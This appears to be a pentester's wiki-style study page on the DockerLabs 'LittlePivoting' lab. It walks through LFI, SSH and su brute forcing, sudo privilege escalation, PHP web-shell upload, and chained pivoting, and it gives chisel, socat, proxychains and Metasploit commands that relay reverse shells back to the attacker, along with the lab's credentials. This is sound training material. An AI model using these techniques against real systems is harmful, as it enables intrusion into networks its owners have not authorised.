---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 10.10.10.2
cves: []
tools: [nmap, arp-scan, gobuster, ffuf, hydra, curl, metasploit, gtfobins, chisel, proxychains]
techniques: [information-gathering, directory-fuzzing, local-file-inclusion, ssh-bruteforce, su-brute-force, sudo-abuse, reverse-shells, web-shell-upload, pivoting, port-forwarding, metasploit-pivoting]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: [[metasploit-pivoting]], [[port-forwarding]], [[chisel]], [[proxychains]], [[guided-pentest]]
---

# LittlePivoting

**Writeups:** [Metasploit run](../../writeups/dockerlabs/intermediate/littlepivoting.md) · [manual chisel/socat run](../../writeups/dockerlabs/intermediate/little-pivoting-manual.md)

Intermediate **pivoting lab**: a 3-host chain across three subnets, reached one hop at a time. Completed twice with different tooling — first with Metasploit routing, then re-run fully manual with chisel/proxychains/socat.

```
Kali (10.10.10.1) ─ 10.10.10.0/24 ─ inclusion (10.10.10.2, 20.20.20.2)
                                   ─ 20.20.20.0/24 ─ trust (20.20.20.3, 30.30.30.2)
                                                    ─ 30.30.30.0/24 ─ upload (30.30.30.3)
```

Each host is **dual-homed** (two NICs) and bridges you to the next subnet. `auto_deploy.sh` creates three Docker bridge networks with Kali as the gateway on each.

## Path — Metasploit run

1. **Recon** — `ip a` + `ip route` map the local interface (`10.10.10.1`); `nmap -sn` finds the entry host `10.10.10.2` ([[information-gathering]]).
2. **inclusion foothold** — `nmap` shows `22`/`80`; [[gobuster]] finds `shop/`; [[local-file-inclusion]] via `?archivo=` reads `/etc/passwd`; [[hydra]] [[ssh-bruteforce]]s `manchi:lovely`.
3. **inclusion privesc** — [[su-brute-force]] (`Linux-Su-Force.sh`) → `seller:qwerty`; `sudo -l` shows `NOPASSWD /usr/bin/php` → root ([[sudo-abuse]], [[gtfobins]]).
4. **Pivot to trust** — bash reverse shell + `shell_to_meterpreter`; `route add 20.20.20.0/24 2`; ping sweep + `portscan/tcp` find `20.20.20.3` (22/80); `portfwd` exposes the web app; [[gobuster]] finds `secret.php` → user `mario`; hydra `mario:chocolate`; `sudo -l` → `/usr/bin/vim` → root ([[metasploit-pivoting]], [[port-forwarding]]).
5. **Pivot to upload** — reverse shell + `shell_to_meterpreter` (set `LHOST` manually — pivot sessions read "Local Pipe"); `route add 30.30.30.0/24 4`; `portscan/tcp` finds `30.30.30.3:80`; `portfwd` + [[web-shell-upload]] of a PHP reverse shell → foothold on `30.30.30.3`; `sudo -l` → `NOPASSWD /usr/bin/env` → root.

## Path — manual re-run (chisel + socat + proxychains)

Same entry point (`shop/` LFI → `manchi:lovely`), but **no privilege escalation is performed at any hop** — a low-priv login is enough to run the tunnel client.

1. **Pivot 1 (inclusion → Kali SOCKS)** — fetch `chisel`/`socat` off Kali's HTTP server; on Kali `chisel server --reverse --port 33`, on inclusion `./chisel client 10.10.10.1:33 R:socks` → SOCKS5 on Kali `127.0.0.1:1080` ([[chisel]]).
2. **Enumerate trust through the proxy** — `proxychains nmap -sT -Pn -n 20.20.20.3`, [[gobuster]] with `--proxy socks5://127.0.0.1:1080`, [[hydra]] and [[ssh]] wrapped in `proxychains` → `mario:chocolate` ([[proxychains]]).
3. **Pivot 2 (trust → Kali, via socat relay)** — trust can't reach Kali directly, so inclusion relays the chisel server port: `./socat tcp-l:333,fork,reuseaddr tcp:10.10.10.1:33`, then `./chisel client 20.20.20.2:333 R:1081:socks` opens a second SOCKS on `127.0.0.1:1081`. The proxychains config carries both ports (`1081` inner, `1080` outer).
4. **Reverse shell back to Kali** — the target can't reach Kali either, so two chained relays build the path: `trust:4444 → inclusion:4443 → Kali:443` (`./socat tcp-l:<port>,fork,reuseaddr tcp:<next-hop>:<port>` on each hop), then `proxychains curl http://30.30.30.3/uploads/revshell.php` fires the payload → `www-data` on upload.

## Credentials

| Host | User | Password |
|------|------|----------|
| inclusion | manchi | lovely |
| inclusion | seller | qwerty |
| trust | mario | chocolate |

## Takeaways

- Pivoting is **one hop at a time**: you can't see an inner subnet until you compromise the dual-homed host bridging it ([[pivoting]]).
- On the compromised host, read the network first (`ip a`, `ip route`, `hostname -I`) — that's how you discover the next subnet.
- Metasploit's `route`/`autoroute` chains hops automatically; `portfwd` relays a service ([[metasploit-pivoting]]).
- `shell_to_meterpreter` can't auto-detect `LHOST` on a pivoted ("Local Pipe") session — set it to an IP the target can reach back to.
- sudo `php`/`vim`/`env` are all GTFOBins one-liners for root ([[sudo-abuse]]).
- **Manual pivoting needs no root**: chisel client + socat relays run fine as the unprivileged login you already have — only *reachable* network position matters ([[chisel]], [[proxychains]]).
- When a hop can't reach the attacker, relay the *listener* instead: `socat tcp-l:PORT,fork,reuseaddr tcp:<next-hop>:PORT` on each host in reverse order builds a path back home.
- One SOCKS proxy turns every per-service trick (`portfwd` per port) into a single config line: `proxychains` wraps nmap (`-sT` — SYN doesn't proxy), gobuster (`--proxy`), hydra, and ssh alike ([[pivoting]]).
